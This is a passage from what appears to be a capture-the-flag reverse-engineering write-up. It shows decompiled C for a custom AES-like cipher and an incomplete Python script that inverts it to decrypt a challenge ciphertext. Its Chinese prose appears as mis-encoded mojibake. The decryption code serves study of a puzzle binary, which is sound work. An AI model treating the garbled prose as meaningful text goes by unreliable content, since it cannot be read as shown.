</span></span></code></pre></td></tr></table>
</div>
</div><p>å¯çŸ¥æ ¸å¿ƒåŠ å¯†åœ¨ sub_402B57(v5, v4, 32);   å¯†æ–‡åœ¨byte_406020[j]ä¸­</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">sub_402B57</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="n">a1</span><span class="p">,</span> <span class="n">_DWORD</span> <span class="o">*</span><span class="n">a2</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">a3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [esp+Ch] [ebp-24h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [esp+10h] [ebp-20h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [esp+14h] [ebp-1Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">_DWORD</span> <span class="o">*</span><span class="n">v7</span><span class="p">;</span> <span class="c1">// [esp+20h] [ebp-10h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [esp+24h] [ebp-Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v7</span> <span class="o">=</span> <span class="n">a1</span> <span class="o">+</span> <span class="mi">44</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">a3</span><span class="p">;</span> <span class="n">i</span> <span class="o">+=</span> <span class="mi">16</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">a216xora116</span><span class="p">(</span><span class="n">a2</span><span class="p">,</span> <span class="n">v7</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">sub_402992</span><span class="p">(</span><span class="n">a2</span><span class="p">,</span> <span class="n">a1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">v7</span> <span class="o">=</span> <span class="n">a2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">a2</span> <span class="o">+=</span> <span class="mi">4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">v4</span> <span class="o">=</span> <span class="n">v7</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="n">v5</span> <span class="o">=</span> <span class="n">v7</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="n">v6</span> <span class="o">=</span> <span class="n">v7</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="n">a1</span><span class="p">[</span><span class="mi">44</span><span class="p">]</span> <span class="o">=</span> <span class="o">*</span><span class="n">v7</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">a1</span><span class="p">[</span><span class="mi">45</span><span class="p">]</span> <span class="o">=</span> <span class="n">v4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">a1</span><span class="p">[</span><span class="mi">46</span><span class="p">]</span> <span class="o">=</span> <span class="n">v5</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">result</span> <span class="o">=</span> <span class="n">v6</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">a1</span><span class="p">[</span><span class="mi">47</span><span class="p">]</span> <span class="o">=</span> <span class="n">v6</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä»”ç»†æŸ¥çœ‹åŠ å¯†å‡½æ•°ï¼Œå’Œå…¶ä¸­è°ƒç”¨çš„å‡½æ•°è¿˜æœ‰çŒœæµ‹æ˜¯AESåŠ å¯†ï¼Œä¸ä¸€æ ·çš„æ˜¯è¿™ä¸ªçš„AES</p>
<p>ä¸­çš„V5æ˜¯ç¨‹åºç”Ÿæˆçš„ï¼Œéœ€è¦åŠ¨è°ƒè·å¾—ã€‚è§£å¯†è„šæœ¬å¦‚ä¸‹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl"><span class="c1"># decrypt_custom_aes.py</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Decrypt ciphertext produced by the provided C implementation (custom S-box + AES-like rounds + CBC).</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Usage: edit cipher_hex below or provide via input.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">typing</span> <span class="kn">import</span> <span class="n">List</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ---------- GF(2^8) helpers (AES poly) ----------</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">gf_mul</span><span class="p">(</span><span class="n">a</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">b</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">res</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">b</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">res</span> <span class="o">^=</span> <span class="n">a</span>
</span></span><span class="line"><span class="cl">        <span class="n">hi</span> <span class="o">=</span> <span class="n">a</span> <span class="o">&amp;</span> <span class="mh">0x80</span>
</span></span><span class="line"><span class="cl">        <span class="n">a</span> <span class="o">=</span> <span class="p">(</span><span class="n">a</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">hi</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">a</span> <span class="o">^=</span> <span class="mh">0x1B</span>
</span></span><span class="line"><span class="cl">        <span class="n">b</span> <span class="o">&gt;&gt;=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">res</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">xtime</span><span class="p">(</span><span class="n">x</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">gf_mul</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ---------- Reproduce the C S-box generation ----------</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">rol8</span><span class="p">(</span><span class="n">x</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">n</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">((</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="n">n</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">x</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="n">n</span><span class="p">)))</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sub_401460</span><span class="p">(</span><span class="n">a1</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">a2</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">rol8</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sub_401496</span><span class="p">(</span><span class="n">a1</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">a2</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">gf_mul</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sub_4014F6</span><span class="p">(</span><span class="n">a1</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">a1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="n">v3</span> <span class="o">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># C code loops i = 0..252 inclusive (253 multiplications)</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">253</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">v3</span> <span class="o">=</span> <span class="n">sub_401496</span><span class="p">(</span><span class="n">v3</span><span class="p">,</span> <span class="n">a1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">v3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sub_401546</span><span class="p">(</span><span class="n">a1</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">v1</span> <span class="o">=</span> <span class="n">sub_401460</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">v1</span> <span class="o">=</span> <span class="n">a1</span> <span class="o">^</span> <span class="n">v1</span>
</span></span><span class="line"><span class="cl">    <span class="n">v2</span> <span class="o">=</span> <span class="n">sub_401460</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span> <span class="o">^</span> <span class="n">v1</span>
</span></span><span class="line"><span class="cl">    <span class="n">v3</span> <span class="o">=</span> <span class="n">sub_401460</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span> <span class="o">^</span> <span class="n">v2</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">v3</span> <span class="o">^</span> <span class="n">sub_401460</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">build_sboxes</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">v3</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">257</span>
</span></span><span class="line"><span class="cl">    <span class="n">v2</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">256</span>
</span></span><span class="line"><span class="cl">    <span class="n">v3</span><span class="p">[</span><span class="mi">256</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xA7</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">v5</span> <span class="o">=</span> <span class="n">sub_4014F6</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">v4</span> <span class="o">=</span> <span class="mh">0xA7</span> <span class="o">^</span> <span class="n">sub_401546</span><span class="p">(</span><span class="n">v5</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">v3</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">v4</span>
</span></span><span class="line"><span class="cl">        <span class="n">v2</span><span class="p">[</span><span class="n">v4</span><span class="p">]</span> <span class="o">=</span> <span class="n">i</span>
</span></span><span class="line"><span class="cl">    <span class="n">s_box</span> <span class="o">=</span> <span class="n">v3</span><span class="p">[:</span><span class="mi">256</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">inv_s</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">256</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">s_box</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">inv_s</span><span class="p">[</span><span class="n">v</span><span class="p">]</span> <span class="o">=</span> <span class="n">i</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">s_box</span><span class="p">,</span> <span class="n">inv_s</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ---------- Inverse transformations ----------</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">inv_shift_rows</span><span class="p">(</span><span class="n">state</span><span class="p">:</span> <span class="n">List</span><span class="p">[</span><span class="nb">int</span><span class="p">])</span> <span class="o">-&gt;</span> <span class="n">List</span><span class="p">[</span><span class="nb">int</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># inverse of the original C sub_401DB1 (reverse the cycles/swaps)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># first 4-cycle (indices 1,5,9,13) was rotated in encryption; inverse:</span>
</span></span><span class="line"><span class="cl">    <span class="n">t</span> <span class="o">=</span> <span class="n">state</span><span class="p">[</span><span class="mi">13</span><span class="p">];</span> <span class="n">state</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">=</span> <span class="n">state</span><span class="p">[</span><span class="mi">9</span><span class="p">];</span> <span class="n">state</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">=</span> <span class="n">state</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span> <span class="n">state</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="n">state</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span> <span class="n">state</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">t</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># swaps (symmetric)</span>
</span></span><span class="line"><span class="cl">    <span class="n">state</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">state</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="n">state</span><span class="p">[</span><span class="mi">10</span><span class="p">],</span> <span class="n">state</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">state</span><span class="p">[</span><span class="mi">6</span><span class="p">],</span> <span class="n">state</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="o">=</span> <span class="n">state</span><span class="p">[</span><span class="mi">14</span><span class="p">],</span> <span class="n">state</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># inverse of the other 4-cycle (3,15,11,7)</span>
</span></span><span class="line"><span class="cl">    <span class="n">t</span> <span class="o">=</span> <span class="n">state</span><span class="p">[</span><span class="mi">7</span><span class="p">];</span> <span class="n">state</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="n">state</span><span class="p">[</span><span class="mi">11</span><span class="p">];</span> <span class="n">state</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">=</span> <span class="n">state</span><span class="p">[</span><span class="mi">15</span><span class="p">];</span> <span class="n">state</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="o">=</span> <span class="n">state</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span> <span class="n">state</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">t</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">state</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">inv_sub_bytes</span><span class="p">(</span><span class="n">state</span><span class="p">:</span> <span class="n">List</span><span class="p">[</span><span class="nb">int</span><span class="p">],</span> <span class="n">inv_sbox</span><span class="p">:</span> <span class="n">List</span><span class="p">[</span><span class="nb">int</span><span class="p">])</span> <span class="o">-&gt;</span> <span class="n">List</span><span class="p">[</span><span class="nb">int</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">[</span><span class="n">inv_sbox</span><span class="p">[</span><span class="n">b</span><span class="p">]</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">state</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">add_round_key</span><span class="p">(</span><span class="n">state</span><span class="p">:</span> <span class="n">List</span><span class="p">[</span><span class="nb">int</span><span class="p">],</span> <span class="n">v5</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="nb">round</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">List</span><span class="p">[</span><span class="nb">int</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">    <span class="n">st</span> <span class="o">=</span> <span class="n">state</span><span class="p">[:]</span>  <span class="c1"># copy</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">key_byte</span> <span class="o">=</span> <span class="n">v5</span><span class="p">[</span><span class="mi">16</span><span class="o">*</span><span class="nb">round</span> <span class="o">+</span> <span class="mi">4</span><span class="o">*</span><span class="n">i</span> <span class="o">+</span> <span class="n">j</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="n">st</span><span class="p">[</span><span class="n">j</span> <span class="o">+</span> <span class="mi">4</span><span class="o">*</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">key_byte</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">st</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">inv_mix_columns</span><span class="p">(</span><span class="n">state</span><span class="p">:</span> <span class="n">List</span><span class="p">[</span><span class="nb">int</span><span class="p">])</span> <span class="o">-&gt;</span> <span class="n">List</span><span class="p">[</span><span class="nb">int</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># This custom mix was algebraically identical to standard AES MixColumns,</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># so we use the standard inverse matrix: [14,11,13,9] etc.</span>
</span></span><span class="line"><span class="cl">    <span class="n">out</span> <span class="o">=</span> <span class="n">state</span><span class="p">[:]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">s0</span> <span class="o">=</span> <span class="n">state</span><span class="p">[</span><span class="mi">4</span><span class="o">*</span><span class="n">c</span> <span class="o">+</span> <span class="mi">0</span><span class="p">];</span> <span class="n">s1</span> <span class="o">=</span> <span class="n">state</span><span class="p">[</span><span class="mi">4</span><span class="o">*</span><span class="n">c</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span> <span class="n">s2</span> <span class="o">=</span> <span class="n">state</span><span class="p">[</span><span class="mi">4</span><span class="o">*</span><span class="n">c</span> <span class="o">+</span> <span class="mi">2</span><span class="p">];</span> <span class="n">s3</span> <span class="o">=</span> <span class="n">state</span><span class="p">[</span><span class="mi">4</span><span class="o">*</span><span class="n">c</span> <span class="o">+</span> <span class="mi">3</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">out</span><span class="p">[</span><span class="mi">4</span><span class="o">*</span><span class="n">c</span> <span class="o">+</span> <span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">gf_mul</span><span class="p">(</span><span class="n">s0</span><span class="p">,</span> <span class="mi">14</span><span class="p">)</span> <span class="o">^</span> <span class="n">gf_mul</span><span class="p">(</span><span class="n">s1</span><span class="p">,</span> <span class="mi">11</span><span class="p">)</span> <span class="o">^</span> <span class="n">gf_mul</span><span class="p">(</span><span class="n">s2</span><span class="p">,</span> <span class="mi">13</span><span class="p">)</span> <span class="o">^</span> <span class="n">gf_mul</span><span class="p">(</span><span class="n">s3</span><span class="p">,</span> <span class="mi">9</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">out</span><span class="p">[</span><span class="mi">4</span><span class="o">*</span><span class="n">c</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">gf_mul</span><span class="p">(</span><span class="n">s0</span><span class="p">,</span> <span class="mi">9</span><span class="p">)</span>  <span class="o">^</span> <span class="n">gf_mul</span><span class="p">(</span><span class="n">s1</span><span class="p">,</span> <span class="mi">14</span><span class="p">)</span> <span class="o">^</span> <span class="n">gf_mul</span><span class="p">(</span><span class="n">s2</span><span class="p">,</span> <span class="mi">11</span><span class="p">)</span> <span class="o">^</span> <span class="n">gf_mul</span><span class="p">(</span><span class="n">s3</span><span class="p">,</span> <span class="mi">13</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">out</span><span class="p">[</span><span class="mi">4</span><span class="o">*</span><span class="n">c</span> <span class="o">+</span> <span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">gf_mul</span><span class="p">(</span><span class="n">s0</span><span class="p">,</span> <span class="mi">13</span><span class="p">)</span> <span class="o">^</span> <span class="n">gf_mul</span><span class="p">(</span><span class="n">s1</span><span class="p">,</span> <span class="mi">9</span><span class="p">)</span>  <span class="o">^</span> <span class="n">gf_mul</span><span class="p">(</span><span class="n">s2</span><span class="p">,</span> <span class="mi">14</span><span class="p">)</span> <span class="o">^</span> <span class="n">gf_mul</span><span class="p">(</span><span class="n">s3</span><span class="p">,</span> <span class="mi">11</span><span class="p">)</span>
